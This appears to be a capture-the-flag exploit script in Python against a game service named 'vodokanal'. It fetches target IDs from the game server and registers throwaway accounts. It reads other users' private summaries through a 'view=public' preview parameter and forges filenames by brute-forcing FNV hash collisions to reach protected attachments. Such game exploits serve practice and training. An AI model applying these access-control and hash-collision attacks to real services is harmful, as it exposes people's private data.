import os
import re
import secrets
import sys
import time
import uuid

import checklib
import requests


FLAG = re.compile(r"^[A-Z0-9]{31}=$")
FLAG_SEARCH = re.compile(r"[A-Z0-9]{31}=")
UUID_V4 = re.compile(r"^[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$")
TIMEOUT = (2, 6)


def target():
    if len(sys.argv) != 2:
        raise ValueError("expected one target IP")
    host = sys.argv[1].strip()
    if not re.fullmatch(r"[A-Za-z0-9.-]+", host):
        raise ValueError("invalid target IP")
    port = int(os.getenv("VDK_PORT", "8080"))
    service = "http://{}:{}".format(host, port)
    forcad = os.getenv("FORCAD_URL", "http://forcad.example:18080").rstrip("/")
    for attempt in range(3):
        try:
            response = requests.get(forcad + "/api/client/attack_data/", timeout=TIMEOUT)
            break
        except requests.RequestException:
            if attempt == 2:
                raise
            time.sleep(0.2)
    response.raise_for_status()
    values = response.json()["vodokanal"].get(host, [])
    if not isinstance(values, list):
        raise ValueError("attack data is not a UUID array")
    identifiers = []
    seen = set()
    for value in values:
        if isinstance(value, str) and UUID_V4.fullmatch(value) and value not in seen:
            identifiers.append(value)
            seen.add(value)
    return service, identifiers


def random_login():
    for _ in range(16):
        value = checklib.rnd_username(salt_length=10).lower()
        if 3 <= len(value) <= 64 and re.fullmatch(r"[a-z0-9._-]+", value) and not value.startswith("vodokanal_"):
            return value
    raise RuntimeError("cannot create login")


def random_password():
    for _ in range(16):
        value = checklib.rnd_password(24)
        if 12 <= len(value) <= 128 and any(c.islower() for c in value) and any(c.isupper() for c in value) and any(c.isdigit() for c in value):
            return value
    raise RuntimeError("cannot create password")


def login(service, username, password, user_agent=None):
    session = checklib.get_initialized_session()
    if user_agent:
        session.headers["User-Agent"] = user_agent
    headers = {"IBSession": "start", "X-Vodokanal-Request": "1", "Idempotency-Key": str(uuid.uuid4())}
    for attempt in range(3):
        try:
            response = session.post(
                service + "/vodokanal/hs/api/v1/auth/session",
                json={}, auth=(username, password), headers=headers, timeout=TIMEOUT,
            )
        except requests.RequestException:
            if attempt == 2:
                raise
            time.sleep(0.2)
            continue
        if response.status_code == 200 and session.cookies.get("ibsession"):
            return session
        if response.status_code not in (429, 502, 503, 504) or attempt == 2:
            raise RuntimeError("login HTTP {}".format(response.status_code))
        time.sleep(0.5)
    raise RuntimeError("login retry exhausted")


def account(service):
    username = random_login()
    password = random_password()
    request_id = str(uuid.uuid4())
    session = checklib.get_initialized_session()
    body = {
        "login": username,
        "displayName": checklib.rnd_username(salt_length=6),
        "password": password,
        "mailboxKey": secrets.token_hex(32),
        "requestId": request_id,
    }
    headers = {"X-Vodokanal-Request": "1", "Idempotency-Key": request_id}
    for attempt in range(3):
        try:
            response = session.post(
                service + "/identity/hs/identity/register",
                json=body, headers=headers, timeout=TIMEOUT,
            )
        except requests.RequestException:
            if attempt == 2:
                raise
            time.sleep(0.2)
            continue
        if response.status_code == 201:
            break
        if response.status_code not in (429, 502, 503, 504) or attempt == 2:
            raise RuntimeError("register HTTP {}".format(response.status_code))
        time.sleep(0.5)
    return login(service, username, password, session.headers.get("User-Agent")), username, password


def post(session, service, path, body):
    headers = {"X-Vodokanal-Request": "1", "Idempotency-Key": str(uuid.uuid4())}
    for attempt in range(3):
        response = session.post(service + "/vodokanal/hs/api" + path, json=body, headers=headers, timeout=TIMEOUT)
        if response.status_code == 429 and attempt < 2:
            time.sleep(1.1)
            continue
        if response.status_code != 201:
            raise RuntimeError("POST {} HTTP {}".format(path, response.status_code))
        return response.json()
    raise RuntimeError("POST retry exhausted")


def create_summary(session, service, title, content, state, batch_id):
    data = post(session, service, "/v1/private-summaries", {
        "title": title,
        "content": content,
        "state": state,
        "batchId": batch_id,
    })
    identifier = data.get("id")
    if not isinstance(identifier, str) or not UUID_V4.fullmatch(identifier):
        raise RuntimeError("invalid created summary ID")
    return identifier


def classify(session, service, identifiers):
    summaries = []
    attachments = []
    prefix = service + "/vodokanal/hs/api/v1/private-summaries/"
    for identifier in identifiers:
        response = None
        for attempt in range(2):
            try:
                response = session.get(prefix + identifier + "/preview", params={"view": "public"}, timeout=TIMEOUT)
                break
            except requests.RequestException:
                if attempt == 0:
                    time.sleep(0.2)
        if response is None:
            continue
        if response.status_code == 200:
            try:
                data = response.json()
            except ValueError:
                continue
            if isinstance(data, dict) and isinstance(data.get("title"), str) and isinstance(data.get("batchId"), str):
                summaries.append((identifier, data))
        elif response.status_code == 404:
            attachments.append(identifier)
        elif response.status_code == 429:
            break
    return summaries, attachments


def public_intakes(service):
    session = checklib.get_initialized_session()
    items = []
    cursor = None
    for _ in range(50):
        params = {"limit": 100}
        if cursor:
            params["cursor"] = cursor
        response = None
        for attempt in range(3):
            try:
                response = session.get(
                    service + "/public-dispatch/hs/dispatch/v1/intakes",
                    params=params,
                    timeout=(2, 10),
                )
                if response.status_code < 500:
                    break
            except requests.RequestException:
                if attempt == 2:
                    break
            time.sleep(0.2)
        if response is None:
            break
        if response.status_code != 200:
            break
        page = response.json()
        if not isinstance(page, dict) or not isinstance(page.get("items"), list):
            break
        items.extend(page["items"])
        if not page.get("hasMore"):
            break
        cursor = page.get("nextCursor")
        if not cursor:
            break
    items = [item for item in items if isinstance(item, dict) and item.get("accepting") and item.get("addresses") and item.get("categories")]
    return sorted(items, key=lambda item: item.get("updatedAt", ""), reverse=True)


def compact_key(value):
    result = 2166136261
    for char in value.encode("ascii"):
        result = ((result ^ char) * 16777619) & 0xffffffff
    return result & 0xfffff


def collision_filename(identifier):
    expected = compact_key(identifier)
    alphabet = b"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
    mask = 0xfffff
    prime = 16777619
    inverse = 803995
    prefix = compact_key("proof")
    forward = {}
    for first in alphabet:
        state = ((prefix ^ first) * prime) & mask
        for second in alphabet:
            forward[((state ^ second) * prime) & mask] = bytes((first, second))
    state = expected
    for char in reversed(b".txt"):
        state = (((state * inverse) & mask) ^ char) & mask
    for fourth in alphabet:
        third_state = (((state * inverse) & mask) ^ fourth) & mask
        for third in alphabet:
            middle = (((third_state * inverse) & mask) ^ third) & mask
            if middle in forward:
                filename = (b"proof" + forward[middle] + bytes((third, fourth)) + b".txt").decode("ascii")
                if compact_key(filename) == expected:
                    return filename
    for number in range(1 << 23):
        filename = "proof{}.txt".format(number)
        if compact_key(filename) == expected:
            return filename
    raise RuntimeError("no compact-key collision")


def report(where, error):
    print("{}: {}".format(where, type(error).__name__), file=sys.stderr)
